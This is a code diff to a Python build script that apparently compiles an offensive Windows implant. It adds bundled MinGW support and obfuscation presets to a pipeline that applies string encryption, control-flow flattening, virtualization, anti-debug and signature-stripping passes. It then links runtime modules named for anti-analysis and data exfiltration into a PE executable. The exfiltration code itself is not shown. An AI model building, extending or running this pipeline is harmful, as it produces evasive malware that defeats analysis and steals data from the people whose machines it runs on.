@@ -16,8 +16,10 @@ import argparse
 import subprocess
 from pathlib import Path
 
-TOOLCHAIN = Path(os.environ.get("TOOLCHAIN_PATH", "toolchain"))
-SRC_DIR = Path(__file__).resolve().parent.parent / "src"
+SCRIPT_DIR = Path(__file__).resolve().parent
+PROJECT_ROOT = SCRIPT_DIR.parent
+TOOLCHAIN = Path(os.environ.get("TOOLCHAIN_PATH", str(PROJECT_ROOT / "toolchain")))
+SRC_DIR = PROJECT_ROOT / "src"
 RUNTIME_DIR = SRC_DIR / "runtime"
 
 sys.path.insert(0, str(SRC_DIR))
@@ -48,9 +50,11 @@ def log(stage, msg):
     print(f"[{ts}] [{stage}] {msg}", flush=True)
 
 
-def run(cmd, label, cwd=None):
+def run(cmd, label, cwd=None, env=None):
     log("exec", f"{label}: {' '.join(str(c) for c in cmd)}")
-    result = subprocess.run(cmd, capture_output=True, text=True, cwd=cwd)
+    if env is None:
+        env = os.environ.copy()
+    result = subprocess.run(cmd, capture_output=True, text=True, cwd=cwd, env=env)
     if result.stdout.strip():
         for line in result.stdout.strip().split("\n"):
             log("exec", f"  stdout: {line}")
@@ -132,18 +136,21 @@ def stage_mlir_obfuscate(ir_path, build_dir, custom_passes=None):
     if custom_passes:
         passes = [p.strip() for p in custom_passes.split(",") if p.strip()]
         if not passes:
-            passes = ["--string-encrypt", "--constant-obfuscate", "--symbol-obfuscate", "--crypto-hash", "--scf-obfuscate", "--import-obfuscate"]
+            passes = []
     else:
-        passes = ["--string-encrypt", "--constant-obfuscate", "--symbol-obfuscate", "--crypto-hash", "--scf-obfuscate", "--import-obfuscate"]
+        passes = []
 
-    log("MLIR", f"Running MLIR obfuscation passes ({len(passes)} total): {', '.join(p.lstrip('-') for p in passes)}")
-
-    mlir_opt = TOOLCHAIN / "bin" / "run-mlir-opt.sh"
-    if not mlir_opt.exists():
-        mlir_opt = TOOLCHAIN / "bin" / "mlir-opt"
-
-    run([str(mlir_opt), f"--load-pass-plugin={plugin}"] + passes + [str(mlir_path), "-o", str(mlir_obf_path)],
-        "MLIR obfuscation")
+    if passes:
+        log("MLIR", f"Running MLIR obfuscation passes ({len(passes)} total): {', '.join(p.lstrip('-') for p in passes)}")
+        mlir_opt = TOOLCHAIN / "bin" / "run-mlir-opt.sh"
+        if not mlir_opt.exists():
+            mlir_opt = TOOLCHAIN / "bin" / "mlir-opt"
+        run([str(mlir_opt), f"--load-pass-plugin={plugin}"] + passes + [str(mlir_path), "-o", str(mlir_obf_path)],
+            "MLIR obfuscation")
+    else:
+        log("MLIR", "No MLIR obfuscation passes enabled (skipping MLIR obfuscation, copying input to output)")
+        import shutil
+        shutil.copy2(mlir_path, mlir_obf_path)
     log("MLIR", f"Obfuscated MLIR: {mlir_obf_path.stat().st_size} bytes, {len(mlir_obf_path.read_text().splitlines())} lines")
 
     log("MLIR", "Converting obfuscated MLIR back to LLVM IR")
@@ -172,15 +179,21 @@ def stage_llvm_obfuscate(bc_path, build_dir, custom_passes=None):
 
     if custom_passes:
         passes = custom_passes
-        log("LLVM-OBF", f"Using custom passes: {passes}")
+        if passes:
+            log("LLVM-OBF", f"Using custom passes: {passes}")
+            run([str(opt), f"-load-pass-plugin={plugin}", f"-passes={passes}", str(bc_path), "-o", str(obf_bc)],
+                "LLVM obfuscation")
+        else:
+            log("LLVM-OBF", "No LLVM obfuscation passes enabled (skipping LLVM obfuscation)")
+            import shutil
+            shutil.copy2(bc_path, obf_bc)
     else:
         function_passes = ["opaque-pred", "substitution", "boguscf", "flattening", "linear-mba"]
         passes = f"strip-signature,pdata-strip,virtualize,function({','.join(function_passes)}),anti-debug,indirect-call"
         log("LLVM-OBF", f"Passes ({len(function_passes) + 5} total - FULL OLLVM SUITE): {passes}")
         log("LLVM-OBF", f"  Recommended order: strip metadata, virtualize, function rewrites, anti-debug, indirect-call last")
-
-    run([str(opt), f"-load-pass-plugin={plugin}", f"-passes={passes}", str(bc_path), "-o", str(obf_bc)],
-        "LLVM obfuscation")
+        run([str(opt), f"-load-pass-plugin={plugin}", f"-passes={passes}", str(bc_path), "-o", str(obf_bc)],
+            "LLVM obfuscation")
 
     orig_size = bc_path.stat().st_size
     obf_size = obf_bc.stat().st_size
@@ -272,13 +285,23 @@ def stage_compile_runtime(build_dir, platform="windows"):
         return objs
 
     log("RUNTIME", "Compiling JOCKY runtime for Windows")
-    # Try MinGW, fallback to clang for Windows PE target
+    # Try system MinGW first (more reliable), then bundled MinGW, fallback to clang
+    mingw_gcc = None
+
+    # Try system MinGW (more reliable cross-compiler setup)
     try:
         subprocess.run(["x86_64-w64-mingw32-gcc", "--version"], capture_output=True, check=True)
         mingw_gcc = "x86_64-w64-mingw32-gcc"
+        log("RUNTIME", "Using system MinGW")
     except (FileNotFoundError, subprocess.CalledProcessError):
-        log("RUNTIME", "MinGW not found, using clang for Windows PE target")
-        mingw_gcc = "clang"
+        # Fallback to bundled MinGW if system not available
+        bundled_mingw = TOOLCHAIN / "mingw" / "bin" / "x86_64-w64-mingw32-gcc"
+        if bundled_mingw.exists():
+            log("RUNTIME", "System MinGW not found, using bundled MinGW")
+            mingw_gcc = str(bundled_mingw)
+        else:
+            log("RUNTIME", "MinGW not found, using clang for Windows PE target")
+            mingw_gcc = "clang"
 
     if mingw_gcc == "clang":
         cflags = ["-O2", "-c", "--target=x86_64-pc-windows-gnu", "-D_WIN32_WINNT=0x0600", "-DUNICODE", "-D_UNICODE",
@@ -293,6 +316,9 @@ def stage_compile_runtime(build_dir, platform="windows"):
 
     WIN = RUNTIME_DIR / "windows"
     sources_win = [
+        # Windows utilities (cross-platform implementations)
+        WIN / "windows_utils.c",
+        # Windows-specific implementations
         RUNTIME_DIR / "init" / "anti_analysis.c",
         RUNTIME_DIR / "util" / "mem.c",
         RUNTIME_DIR / "exfil" / "exfil.c",
@@ -327,16 +353,45 @@ def stage_compile_runtime(build_dir, platform="windows"):
         "-I", str(RUNTIME_DIR / "windows"),
     ]
 
+    # Set up environment for bundled MinGW only if using it
+    compile_env = os.environ.copy()
+    extra_flags = []
+    use_bundled = mingw_gcc.startswith(str(TOOLCHAIN / "mingw"))
+
+    if use_bundled:
+        bundled_mingw_bin = TOOLCHAIN / "mingw" / "bin"
+        bundled_mingw_lib = TOOLCHAIN / "mingw" / "lib"
+        # Prioritize bundled toolchain bin directory in PATH
+        if "PATH" in compile_env:
+            compile_env["PATH"] = str(bundled_mingw_bin) + ":" + compile_env["PATH"]
+        else:
+            compile_env["PATH"] = str(bundled_mingw_bin)
+        # Add bundled MinGW lib to library search paths
+        ld_path = str(bundled_mingw_lib)
+        if "LD_LIBRARY_PATH" in compile_env:
+            compile_env["LD_LIBRARY_PATH"] = ld_path + ":" + compile_env["LD_LIBRARY_PATH"]
+        else:
+            compile_env["LD_LIBRARY_PATH"] = ld_path
+        # Tell gcc where to find cc1 and other internal tools (use 10-win32 version)
+        mingw_include = str(TOOLCHAIN / "mingw" / "x86_64-w64-mingw32" / "include")
+        mingw_lib = str(TOOLCHAIN / "mingw" / "x86_64-w64-mingw32" / "lib")
+        extra_flags = [
+            "-B", str(TOOLCHAIN / "mingw" / "lib" / "10-win32") + "/",
+            "-I", mingw_include,
+            "-L", mingw_lib,
+        ]
+
     for src in sources_win:
         if not src.exists():
             log("RUNTIME", f"  skip (not found): {src.name}")
             continue
         obj = build_dir / f"rt_{src.parent.name}_{src.stem}.o"
         try:
-            run([mingw_gcc] + cflags_win + [
+            run([mingw_gcc] + extra_flags + cflags_win + [
                  "-I", str(src.parent),
                  str(src), "-o", str(obj)],
-                f"Compile {src.name}")
+                f"Compile {src.name}",
+                env=compile_env)
             objs.append(obj)
             log("RUNTIME", f"  compiled: {src.name} -> {obj.stat().st_size} bytes")
         except SystemExit:
@@ -376,12 +431,50 @@ def stage_link(obj_path, runtime_objs, build_dir, output_name, platform="windows
         return exe_path
 
     log("LINK", "Linking Windows PE executable")
-    # Use clang if MinGW not available
+    # Try system MinGW first (more reliable), then bundled, fallback to clang
+    link_env = os.environ.copy()
+    use_bundled = False
+
     try:
         subprocess.run(["x86_64-w64-mingw32-gcc", "--version"], capture_output=True, check=True)
         linker = "x86_64-w64-mingw32-gcc"
+        log("LINK", "Using system MinGW")
     except (FileNotFoundError, subprocess.CalledProcessError):
-        linker = "clang"
+        bundled_mingw = TOOLCHAIN / "mingw" / "bin" / "x86_64-w64-mingw32-gcc"
+        if bundled_mingw.exists():
+            linker = str(bundled_mingw)
+            use_bundled = True
+            log("LINK", "System MinGW not found, using bundled MinGW")
+        else:
+            linker = "clang"
+            log("LINK", "Using clang for Windows PE target")
+
+    # Set up environment for bundled MinGW
+    linker_flags = []
+    if use_bundled:
+        bundled_mingw_bin = TOOLCHAIN / "mingw" / "bin"
+        bundled_mingw_lib = TOOLCHAIN / "mingw" / "lib"
+        if bundled_mingw_lib.exists():
+            # Prioritize bundled toolchain bin directory in PATH
+            if "PATH" in link_env:
+                link_env["PATH"] = str(bundled_mingw_bin) + ":" + link_env["PATH"]
+            else:
+                link_env["PATH"] = str(bundled_mingw_bin)
+            ld_path = str(bundled_mingw_lib)
+            if "LD_LIBRARY_PATH" in link_env:
+                link_env["LD_LIBRARY_PATH"] = ld_path + ":" + link_env["LD_LIBRARY_PATH"]
+            else:
+                link_env["LD_LIBRARY_PATH"] = ld_path
+            # Explicitly set LD to use bundled linker
+            link_env["LD"] = str(bundled_mingw_bin / "x86_64-w64-mingw32-ld")
+            # Tell gcc where to find cc1 and other internal tools, plus include/lib paths
+            mingw_lib = str(TOOLCHAIN / "mingw" / "x86_64-w64-mingw32" / "lib")
+            linker_flags = [
+                "-B", str(TOOLCHAIN / "mingw" / "lib" / "10-win32") + "/",
+                "-L", mingw_lib,
+                "-fno-use-linker-plugin",
+                f"-fuse-ld={str(bundled_mingw_bin / 'x86_64-w64-mingw32-ld')}"
+            ]
 
     all_objs = [str(obj_path)] + [str(o) for o in runtime_objs]
     if linker == "clang":
@@ -396,12 +489,13 @@ def stage_link(obj_path, runtime_objs, build_dir, output_name, platform="windows
     else:
         cmd = [
             linker,
+            *linker_flags,
             *all_objs,
             "-lntdll", "-lwinhttp", "-ldnsapi", "-lwevtapi",
             "-ladvapi32", "-lkernel32", "-lws2_32",
             "-o", str(exe_path),
         ]
-    run(cmd, "Link PE executable")
+    run(cmd, "Link PE executable", env=link_env)
     log("LINK", f"Output: {exe_path} ({exe_path.stat().st_size} bytes)")
 
     result = subprocess.run(["file", str(exe_path)], capture_output=True, text=True)
@@ -443,10 +537,39 @@ def main():
     ir_path = stage_codegen(ast, build_dir)
 
     log("PIPELINE", "Stage 3/6: MLIR Obfuscation")
-    mlir_bc = stage_mlir_obfuscate(ir_path, build_dir, args.mlir_passes if args.mlir_passes else None)
+    # Use custom MLIR passes if provided, otherwise use preset
+    mlir_passes_arg = None
+    if args.mlir_passes:
+        mlir_passes_arg = args.mlir_passes
+    else:
+        preset = PRESETS.get(args.preset, PRESETS["standard"])
+        mlir_passes_arg = ",".join(preset["mlir"])
+        if mlir_passes_arg:
+            log("PIPELINE", f"Using MLIR passes from '{args.preset}' preset: {mlir_passes_arg}")
+    mlir_bc = stage_mlir_obfuscate(ir_path, build_dir, mlir_passes_arg if mlir_passes_arg else None)
 
     log("PIPELINE", "Stage 4/6: LLVM Obfuscation")
-    obf_bc = stage_llvm_obfuscate(mlir_bc, build_dir, args.llvm_passes if args.llvm_passes else None)
+    # Use custom LLVM passes if provided, otherwise use preset
+    llvm_passes_arg = None
+    if args.llvm_passes:
+        llvm_passes_arg = args.llvm_passes
+    else:
+        preset = PRESETS.get(args.preset, PRESETS["standard"])
+        # Convert preset LLVM list to the format expected by stage_llvm_obfuscate
+        llvm_list = preset["llvm"]
+        if llvm_list:
+            # Separate function passes from module passes
+            function_passes = [p for p in llvm_list if p not in ("strip-signature", "indirect-call")]
+            module_passes = [p for p in llvm_list if p in ("strip-signature", "indirect-call")]
+            parts = []
+            if function_passes:
+                parts.append(f"function({','.join(function_passes)})")
+            if module_passes:
+                parts.append(",".join(module_passes))
+            llvm_passes_arg = ",".join(parts) if parts else ""
+            if llvm_passes_arg:
+                log("PIPELINE", f"Using LLVM passes from '{args.preset}' preset: {llvm_passes_arg}")
+    obf_bc = stage_llvm_obfuscate(mlir_bc, build_dir, llvm_passes_arg if llvm_passes_arg else None)
 
     log("PIPELINE", "Stage 5/6: Cross-Compile")
     obj_path = stage_compile(obf_bc, build_dir, args.platform)
